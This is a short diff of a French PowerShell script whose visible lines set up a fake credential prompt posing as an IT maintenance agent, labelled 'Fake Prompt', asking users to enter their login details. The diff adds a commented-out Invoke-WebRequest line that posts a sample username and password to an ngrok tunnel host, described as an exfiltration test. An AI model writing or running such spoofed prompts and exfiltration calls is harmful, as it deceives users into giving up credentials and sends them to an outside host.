@@ -1,3 +1,5 @@
+
+#Invoke-WebRequest -Uri "https://nonbitter-ernie-unorganisable.ngrok-free.dev" -Method Post -Body "Test d'exfiltration : Admin / P@ssword123"
 # 1. Demande de mot de passe (Fake Prompt)
 $caption = "Authentification Requise - Agent de Maintenance IT";
 $message = "Veuillez saisir vos identifiants pour autoriser le diagnostic du système.";
